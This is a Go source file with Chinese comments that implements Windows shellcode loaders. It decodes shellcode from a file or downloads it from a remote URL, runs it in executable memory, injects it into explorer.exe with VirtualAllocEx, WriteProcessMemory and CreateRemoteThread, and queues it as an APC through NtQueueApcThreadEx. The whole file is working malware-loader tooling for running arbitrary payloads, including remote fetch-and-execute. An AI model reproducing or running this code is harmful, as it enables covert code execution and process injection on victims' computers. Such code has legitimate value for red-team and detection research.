package tools

import (
	"fmt"
	"golang.org/x/sys/windows"
	"io"
	"net/http"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT        = 0x1000
	MEM_RESERVE       = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE    = 0x04
)

const (
	QUEUE_USER_APC_FLAGS_NONE = iota
	QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
	QUEUE_USER_APC_FLGAS_MAX_VALUE
)

func checkErr(err error) {
	if err != nil { //如果内存调用出现错误，可以报出
		if err.Error() != "The operation completed successfully." { //如果调用dll系统发出警告，但是程序运行成功，则不进行警报
			println(err.Error()) //报出具体错误
			os.Exit(1)
		}
	}
}

func original_loader(shellcode []byte) {
	var (
		kernel32      = syscall.MustLoadDLL("kernel32.dll")   //调用kernel32.dll
		ntdll         = syscall.MustLoadDLL("ntdll.dll")      //调用ntdll.dll
		VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") //使用kernel32.dll调用ViretualAlloc函数
		RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //使用ntdll调用RtCopyMemory函数
	)
	//调用VirtualAlloc为shellcode申请一块内存
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	//调用RtlCopyMemory来将shellcode加载进内存当中
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)
	//syscall来运行shellcode
	_, _, _ = syscall.SyscallN(addr, 0, 0, 0, 0)
}

func OriginalLoader(fp string) {
	encodeDataByte, err := os.ReadFile(fp)
	if err != nil {
		fmt.Printf("读取文件时出错: %v\n", err)
	}
	shellcode := Decode(encodeDataByte)
	original_loader(shellcode)
}

func Remote_loader(url string) []byte {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("error when getting remote connection")
		return nil
	}
	defer resp.Body.Close()
	encodeDataByte, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("error when getting remote connection")
		return nil
	}
	shellcode := Decode(encodeDataByte)
	original_loader(shellcode)
	return nil
}

func createProcess(processName string) (windows.Handle, error) {
	processID, err := getProcessIdByName(processName)
	if err != nil {
		return 0, err
	}
	return windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, processID)
}

// 获取pid句柄
func getProcessHandleByName(processName string) (windows.Handle, error) {
	var processSnap windows.Handle
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	processSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(processSnap)

	if err := windows.Process32First(processSnap, &pe32); err != nil {
		return 0, err
	}

	for {
		currentProcessName := syscall.UTF16ToString(pe32.ExeFile[:])
		if currentProcessName == processName {
			return windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pe32.ProcessID)
		}
		if err := windows.Process32Next(processSnap, &pe32); err != nil {
			return 0, err
		}
	}
}

func GetAllProcessIdByName(processName string) ([]uint32, error) {
	var processIDs []uint32
	var processSnap windows.Handle
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	processSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(processSnap)

	if err := windows.Process32First(processSnap, &pe32); err != nil {
		return nil, err
	}

	for {
		currentProcessName := syscall.UTF16ToString(pe32.ExeFile[:])
		if currentProcessName == processName {
			processIDs = append(processIDs, pe32.ProcessID)
		}
		if err := windows.Process32Next(processSnap, &pe32); err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			return nil, err
		}
	}
	return processIDs, nil
}

// 获取pid号
func getProcessIdByName(processName string) (uint32, error) {
	var processSnap windows.Handle
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	processSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(processSnap)

	if err := windows.Process32First(processSnap, &pe32); err != nil {
		return 0, err
	}

	for {
		currentProcessName := syscall.UTF16ToString(pe32.ExeFile[:])
		if currentProcessName == processName {
			return pe32.ProcessID, nil
		}
		if err := windows.Process32Next(processSnap, &pe32); err != nil {
			return 0, err
		}
	}
}

// 进程地址上分配内存
func allocateMemoryInProcess(hProcess windows.Handle, shellcode []byte) (uintptr, error) {
	size := uint32(len(shellcode))

	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
	}
	defer windows.FreeLibrary(kernel32Handle)

	virtualAllocExAddr, err := windows.GetProcAddress(kernel32Handle, "VirtualAllocEx")
	if err != nil {
	}
	lpBaseAddress, _, err := syscall.SyscallN(virtualAllocExAddr,
		uintptr(hProcess),
		0,
		uintptr(size),
		uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
		uintptr(windows.PAGE_EXECUTE_READWRITE))
	return lpBaseAddress, err
}

// 写入shellcode
func writeShellcodeToProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, shellcode []byte) error {
	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		return err
	}
	defer windows.FreeLibrary(kernel32Handle)

	writeProcessMemoryAddr, err := windows.GetProcAddress(kernel32Handle, "WriteProcessMemory")
	if err != nil {
		return err
	}

	_, _, err = syscall.SyscallN(writeProcessMemoryAddr,
		uintptr(hProcess),
		lpBaseAddress,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0)
	return err
}

// 通过pid获取线程
func getThreadIdByProcessId(processID uint32) (uint32, error) {
	//bufferLength := uint32(1000)
	var te32 windows.ThreadEntry32
	te32.Size = uint32(unsafe.Sizeof(te32))

	hSnapshot, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	defer windows.CloseHandle(hSnapshot)

	_ = windows.Thread32First(hSnapshot, &te32)

	for {
		if te32.OwnerProcessID == processID {
			return te32.ThreadID, nil
		}
		if err := windows.Thread32Next(hSnapshot, &te32); err != nil {
			return 0, err
		}
	}
}

// 线程执行
func createRemoteThreadToExecute(hProcess windows.Handle, lpBaseAddress uintptr) error {
	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		return err
	}
	defer windows.FreeLibrary(kernel32Handle)

	createRemoteThreadAddr, err := windows.GetProcAddress(kernel32Handle, "CreateRemoteThread")
	if err != nil {
		return err
	}

	_, _, err = syscall.SyscallN(createRemoteThreadAddr,
		uintptr(hProcess),
		0,
		0,
		lpBaseAddress,
		0,
		0,
		0)
	return err
}

// 插入apc
func setupAPC(addr uintptr) error {
	const (
		QUEUE_USER_APC_FLAGS_NONE = iota
		QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
		QUEUE_USER_APC_FLGAS_MAX_VALUE
	)

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	GetCurrentThread := kernel32.NewProc("GetCurrentThread")
	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")

	thread, _, err := GetCurrentThread.Call()

	_, _, err = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
	return err
}

// 内存复制
func memcpy(dst, src unsafe.Pointer, n uintptr) {
	for i := uintptr(0); i < n; i++ {
		*(*byte)(unsafe.Pointer(uintptr(dst) + i)) = *(*byte)(unsafe.Pointer(uintptr(src) + i))
	}
}

// 分配内存-写入shellcode-修改可读可写内存为可读可执行
func allocateAndProtectMemory(shellcode []byte) (uintptr, error) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := PAGE_READWRITE
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	return addr, nil
}

// 寻找pid 然后打开进程 申请空间后注入 最后通过新线程执行
func ThreadShellcodeInject(fp string) error {
	encodeDataByte, err := os.ReadFile(fp)
	if err != nil {
		fmt.Printf("读取文件时出错: %v\n", err)
	}
	shellcode := Decode(encodeDataByte)
	// 获取notepad.exe进程句柄
	hProcess, err := getProcessHandleByName("explorer.exe")
	defer windows.CloseHandle(hProcess)

	// 在目标进程中分配内存
	lpBaseAddress, err := allocateMemoryInProcess(hProcess, shellcode)
	// 向目标进程内存写入shellcode
	err = writeShellcodeToProcessMemory(hProcess, lpBaseAddress, shellcode)
	// 创建远程线程来执行注入的代码
	err = createRemoteThreadToExecute(hProcess, lpBaseAddress)

	return nil
}

// 创建一个RWX的进程，通过apc注入shellcode到线程中
func EarlybirlInject(fp string) error {

	encodeDataByte, err := os.ReadFile(fp)
	if err != nil {
		fmt.Printf("读取文件时出错: %v\n", err)
	}
	shellcode := Decode(encodeDataByte)
	
	addr, _ := allocateAndProtectMemory(shellcode)
	setupAPC(addr)

	return nil
}
